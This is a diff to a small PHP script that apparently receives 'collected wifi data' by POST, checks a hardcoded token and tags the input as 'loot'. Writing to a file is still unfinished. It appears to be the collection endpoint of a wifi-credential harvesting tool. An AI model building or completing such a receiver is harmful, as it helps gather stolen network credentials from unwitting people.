@@ -17,31 +17,30 @@ and to permit persons to whom the Software is furnished to do so
 $data=""; //will contain the collected wifi data
 
 //Verify on POST paramter token
-
 function verfiy($r_token,$data){
 	$token="1s5d47s98qwASDaw598wD51Dfg47m85C"; //Initialize Token (32 digit) 
-	//testing
-	echo "Token is >> ". $r_token. "\n";
+	//echo "Token is >> ". $r_token. "\n"; //testing
 	if ($r_token == $token) {
-	//	loot($data);
-		//testing
-		echo "Token valid looting...";
+		loot(0,$data);
+		//echo "Token valid looting..."; //testing
 	} else {
-	//	error();
-		//testing
-		echo "Token invalid dropping...";
+		loot(1,$data);
+		// echo "Token invalid dropping..."; //testing
 	}
 }
 
-
 //Open loot file append mode only and write the keys paramter
+function loot($flag,$data){
+	if ($flag == 0) {
+		$current = "[[DATA]] ".$data."\n";
+	} else {
+		$current = "[[ERROR]] invalid token"."\n";
+	}
+	//// need to write the loot ot a file !!
 
-/*function loot($data){
-	// write to loot.txt
-}*/
+}
 
 // Request Handling
-
 if( $_POST["token"] && $_POST["data"] ) {
 	verfiy($_POST['token'],$_POST['data']);
     exit();
